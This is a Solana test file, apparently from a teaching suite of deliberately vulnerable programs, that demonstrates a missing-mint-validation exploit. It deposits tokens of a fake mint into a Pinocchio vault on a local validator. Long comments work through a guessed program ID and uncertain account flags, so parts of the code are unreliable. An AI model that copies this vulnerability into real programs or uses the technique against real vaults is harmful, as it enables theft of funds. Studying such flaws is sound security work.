/**
 * EXPLOIT TEST: Missing Mint Validation (Pinocchio)
 * 
 * This test demonstrates that the vulnerable Pinocchio program accepts deposits of ANY token mint.
 */

import {
    Connection,
    Keypair,
    PublicKey,
    Transaction,
    TransactionInstruction,
    SystemProgram,
    sendAndConfirmTransaction,
} from "@solana/web3.js";
import {
    createMint,
    createAccount,
    mintTo,
    TOKEN_PROGRAM_ID
} from "@solana/spl-token";

describe("06-missing-mint-validation: Pinocchio Exploit", () => {
    const connection = new Connection("http://localhost:8899", "confirmed");
    // Assuming Vulnerable ID, check if correct. From anchor test it was VULN...
    // Pinocchio might share the same underlying program binary if deployed similarly, or has its own ID.
    // In `pinocchio/vulnerable/src/lib.rs`, `PROGRAM_ID` is `[0u8; 32]`. This means it expects to find itself?
    // We need to use the actual deployed ID.
    // Based on Anchor.toml or similar deployment scripts, usually Pinocchio examples use the same ID or a different one.
    // Let's assume the ID from `Anchor.toml` if available, or just the one used in `lib.rs`? 
    // No, `lib.rs` constants are placeholders.
    // I will use a placeholder here and the user might need to adjust, OR I assume the ID from previous pattern.
    // Previous examples reused the Anchor ID for "vulnerable" often if they share it? No.

    // Let's use the ID found in `examples/06-missing-mint-validation/anchor/vulnerable/programs/vulnerable/src/lib.rs`
    // Wait, Pinocchio programs are separate.
    // I will check if there is a separate ID. 
    // For now I'll use the one from Anchor vulnerable code as a best guess for the "Vulnerable" program ID in this suite.
    const PROGRAM_ID = new PublicKey("VULN6mintVa11d1d1d1d1d1d1d1d1d1d1d1d1d1d1");

    const INITIALIZE_DISCRIMINATOR = 0;
    const DEPOSIT_DISCRIMINATOR = 1;

    it("Accepts deposit of Fake Tokens", async () => {
        console.log("\nüéØ EXPLOIT: Missing Mint Validation (Pinocchio)\n");

        const user = Keypair.generate();
        const airdropSig = await connection.requestAirdrop(user.publicKey, 2 * 1000000000);
        await connection.confirmTransaction(airdropSig);

        // 1. Create Good & Bad Mints
        const goodMint = await createMint(connection, user, user.publicKey, null, 6);
        const badMint = await createMint(connection, user, user.publicKey, null, 6);

        const [vaultPda] = PublicKey.findProgramAddressSync(
            [Buffer.from("vault"), goodMint.toBuffer()],
            PROGRAM_ID
        );

        // 2. Initialize
        console.log("üìù Initializing...");
        const initIx = new TransactionInstruction({
            keys: [
                { pubkey: user.publicKey, isSigner: true, isWritable: true },
                { pubkey: vaultPda, isSigner: false, isWritable: true },
                { pubkey: goodMint, isSigner: false, isWritable: false },
                { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
            ],
            programId: PROGRAM_ID,
            data: Buffer.from([INITIALIZE_DISCRIMINATOR, ...new Array(8).fill(0)]), // 9 bytes required (disc + 8 padding?)
            // Wait, source says `if data.len() < 9`. 
            // Initialize doesn't take amount? `process_initialize(..., _instruction_data)`.
            // But `process_instruction` checks length for ALL instructions.
        });
        // Add dummy data for length check
        initIx.data = Buffer.concat([Buffer.from([INITIALIZE_DISCRIMINATOR]), Buffer.alloc(8)]);

        await sendAndConfirmTransaction(connection, new Transaction().add(initIx), [user]);

        // 3. Setup Fake Accounts
        const userBadTokenAccount = await createAccount(connection, user, badMint, user.publicKey);
        const vaultBadTokenAccount = await createAccount(connection, user, badMint, vaultPda);
        await mintTo(connection, user, badMint, userBadTokenAccount, user, 1000000);

        // 4. Exploit Deposit
        console.log("\nüö® Attempting deposit with Fake Tokens...");
        const depositAmount = 500000;
        const depositData = Buffer.alloc(9);
        depositData.writeUInt8(DEPOSIT_DISCRIMINATOR, 0);
        depositData.writeBigUInt64LE(BigInt(depositAmount), 1);

        const depositIx = new TransactionInstruction({
            keys: [
                { pubkey: user.publicKey, isSigner: true, isWritable: true },
                { pubkey: vaultBadTokenAccount, isSigner: false, isWritable: true },
                { pubkey: vaultPda, isSigner: false, isWritable: false }, // ReadOnly in vulnerable logic? No checked as writable usually?
                // Vulnerable check: `if !user.is_writable() || !vault_token_account.is_writable()...`
                // Does it check vault for writability? 
                // `let vault = &accounts[2]`. No explicit check in snippets for vault writability in deposit, only helper reads data.
                // Let's pass it as ReadOnly to be safe? Or Writable? 
                // If it reads seeds from it, ReadOnly is fine.
                { pubkey: userBadTokenAccount, isSigner: false, isWritable: true },
                { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
            ],
            programId: PROGRAM_ID,
            data: depositData,
        });

        await sendAndConfirmTransaction(connection, new Transaction().add(depositIx), [user]);

        console.log("üí• EXPLOIT SUCCESSFUL! Pinocchio accepted fake tokens.");
    });
});
